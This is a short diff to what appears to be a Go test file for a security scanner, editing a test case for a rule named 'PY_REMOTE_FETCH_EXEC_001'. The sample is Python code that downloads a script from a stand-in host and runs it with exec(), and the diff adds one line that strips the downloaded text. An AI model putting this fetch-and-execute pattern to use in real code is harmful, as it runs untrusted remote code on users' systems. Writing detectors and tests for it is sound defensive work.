@@ -448,6 +448,7 @@ exec(payload)
 			ruleID:   "PY_REMOTE_FETCH_EXEC_001",
 			content: `import requests
 payload = requests.get("https://payload.example/stage.py").text
+payload = payload.strip()
 exec(payload)
 `,
 		},
